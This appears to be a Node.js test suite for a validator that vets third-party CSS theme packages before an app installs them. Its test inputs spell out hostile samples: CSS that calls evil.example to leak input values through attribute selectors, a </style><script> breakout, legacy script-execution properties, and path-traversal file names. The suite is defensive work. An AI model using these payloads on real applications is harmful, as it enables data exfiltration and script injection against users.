const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const { inspectCss, inspectPackage, explain, MAX_CSS_BYTES } = require('../lib/theme-package.js');

const ids = (r) => r.problems.map((p) => p.id).sort();

test('a real theme passes — this is not a filter that blocks everything', () => {
  // The shipped Nocturne tokens are the bar: if the gate cannot pass Khayt's own
  // themes it is not a gate, it is a wall.
  const real = fs.readFileSync(path.join(__dirname, '..', 'renderer', 'themes', 'nocturne', 'tokens.css'), 'utf8');
  const r = inspectCss(real, 'nocturne/tokens.css');
  assert.equal(r.ok, true, explain(r));
});

test('every shipped theme would install', () => {
  const dir = path.join(__dirname, '..', 'renderer', 'themes');
  for (const theme of fs.readdirSync(dir)) {
    const f = path.join(dir, theme, 'tokens.css');
    if (!fs.existsSync(f)) continue;
    const r = inspectCss(fs.readFileSync(f, 'utf8'), `${theme}/tokens.css`);
    assert.equal(r.ok, true, `${theme} would be refused:\n${explain(r)}`);
  }
});

test('a theme cannot phone home', () => {
  // The quiet one. It fires on render, needs no interaction, and CSS attribute
  // selectors can make the request depend on what is on screen — which is how a
  // stylesheet becomes an exfiltration channel rather than a beacon.
  const attacks = [
    'body { background: url(https://evil.example/p.png); }',
    ".x { background-image: url('http://10.0.0.1/x'); }",
    '@font-face { font-family: x; src: url(//evil.example/f.woff2); }',
    '.y { cursor: url(https://evil.example/c.cur), auto; }',
    '.z { mask-image: url(https://evil.example/m.svg); }',
    "input[value^='a'] { background: url(https://evil.example/leak?a); }",
  ];
  for (const css of attacks) {
    assert.deepEqual(ids(inspectCss(css)), ['remote-url'], css);
  }
  // An inline image is self-contained and stays allowed — a theme may ship a
  // texture, it may not fetch one.
  assert.equal(inspectCss('.a{background:url("data:image/png;base64,iVBORw0KGgo=")}').ok, true);
  assert.equal(inspectCss('.a{background:url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)}').ok, true);
});

test('a theme cannot fetch more CSS later', () => {
  // Otherwise what was reviewed at install time is not what runs tomorrow.
  for (const css of ['@import url(https://evil.example/x.css);', '@IMPORT "more.css";']) {
    assert.ok(ids(inspectCss(css)).includes('import'), css);
  }
});

test('a theme cannot stop being CSS', () => {
  // It gets injected into a <style> element; the literal closing tag ends it.
  for (const css of ['a{}</style><script>fetch("//x")</script>', 'a{}< / STYLE >']) {
    assert.ok(ids(inspectCss(css)).includes('style-break'), css);
  }
  assert.ok(ids(inspectCss('a{ behavior: url(x.htc) }')).includes('script-ish'));
  assert.ok(ids(inspectCss('a{ width: expression(alert(1)) }')).includes('script-ish'));
  assert.ok(ids(inspectCss('a{ -moz-binding: url(x.xml) }')).includes('script-ish'));
});

test('a theme cannot put words or figures on the screen', () => {
  // A price with a different number beside it is worse than a broken layout,
  // because it is legible and wrong.
  assert.ok(ids(inspectCss('.total::after { content: " — paid in full"; }')).includes('content-text'));
  assert.ok(ids(inspectCss(".amount::before{content:'0.00 '}")).includes('content-text'));

  // The legitimate uses stay legitimate: icons via counters, values via attr(),
  // and the empty string that makes a pseudo-element exist at all.
  for (const ok of [
    '.a::before { content: ""; }',
    '.a::before { content: none; }',
    '.a::after { content: attr(data-label); }',
    '.list li::before { content: counter(n); }',
    '.q::before { content: open-quote; }',
  ]) {
    assert.equal(inspectCss(ok).ok, true, ok);
  }
});

test('a theme cannot blank the app or cover it', () => {
  assert.ok(ids(inspectCss('body { display: none; }')).includes('hide-all'));
  assert.ok(ids(inspectCss('* { display:none }')).includes('hide-all'));
  assert.ok(ids(inspectCss('* { position: fixed; inset: 0; }')).includes('overlay-all'));
  // Styling Khayt's own classes is the entire legitimate job and must not trip it.
  assert.equal(inspectCss('.khayt-navitem { display: none; }').ok, true);
  assert.equal(inspectCss('.theme-picker-card { position: fixed; }').ok, true);
});

test('a construct inside a comment is not a construct', () => {
  // Otherwise a theme documenting what it does not do gets refused for saying so.
  assert.equal(inspectCss('/* no url(https://x) here */ a { color: red }').ok, true);
  // …but a comment cannot be used to smuggle one either.
  assert.ok(ids(inspectCss('a{/* */background:url(https://evil.example/x)}')).includes('remote-url'));
});

test('size and encoding are bounded', () => {
  const big = `a{color:red}`.repeat(Math.ceil(MAX_CSS_BYTES / 12) + 10);
  assert.ok(ids(inspectCss(big)).includes('too-big'));
  assert.ok(ids(inspectCss('a{color:red}\u0000')).includes('nul'));
  for (const junk of [null, undefined, 42, {}, []]) {
    assert.equal(inspectCss(junk).ok, false, String(junk));
  }
});

test('a package is its manifest plus exactly the files it declares', () => {
  const good = {
    manifest: { id: 'my-shop', name: 'My Shop', tokens: 'tokens.css' },
    files: { 'tokens.css': ':root { --accent: #0af; }' },
  };
  const r = inspectPackage(good);
  assert.equal(r.ok, true, explain(r));
  assert.equal(r.id, 'my-shop');
  assert.deepEqual(r.files, ['tokens.css']);

  // A file nobody declared is a file carried for another reason.
  const smuggled = { ...good, files: { ...good.files, 'extra.js': 'fetch("//x")' } };
  assert.ok(inspectPackage(smuggled).problems.some((p) => p.id === 'unexpected-file'));

  // A declared file that is not there is a broken theme, not a silent one.
  assert.ok(inspectPackage({ manifest: good.manifest, files: {} })
    .problems.some((p) => p.id === 'missing-file'));

  // Path traversal is refused here too — before anything is written, not only at
  // registration. This runs on a file that nothing has trusted yet.
  for (const bad of ['../../etc/passwd', '/abs/x.css', 'a/b.css', 'x.css\u0000.png', 'evil.js']) {
    const r2 = inspectPackage({ manifest: { id: 'x', name: 'X', tokens: bad }, files: {} });
    assert.ok(r2.problems.some((p) => p.id === 'bad-css-name'), bad);
  }
});

test('bad packages are refused whole, and say why in a sentence', () => {
  for (const junk of [null, undefined, {}, { manifest: 'nope' }, { manifest: [] }]) {
    const r = inspectPackage(junk);
    assert.equal(r.ok, false);
    assert.equal(typeof explain(r), 'string');
    assert.ok(explain(r).length > 0);
  }
  const r = inspectPackage({
    manifest: { id: 'x', name: 'X', tokens: 'tokens.css' },
    files: { 'tokens.css': '@import "x"; a{background:url(https://e/x)}' },
  });
  assert.equal(r.ok, false);
  // Every problem is reported, not just the first — an author fixing one at a
  // time through a dialog is an author who gives up.
  assert.ok(r.problems.length >= 2);
  assert.match(explain(r), /^• /m);
});

test('the CSS is never rewritten, only judged', () => {
  // Refusing on sight beats cleaning up: a theme that was edited into something
  // its author did not write is a theme nobody can support, and a sanitiser is a
  // good place to hide a bypass.
  const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'theme-package.js'), 'utf8');
  const fn = src.slice(src.indexOf('function inspectCss'), src.indexOf('function inspectPackage'));
  assert.ok(!/return\s+\{[^}]*\bcss\b\s*:/.test(fn), 'inspectCss returns a verdict, never a modified stylesheet');
});
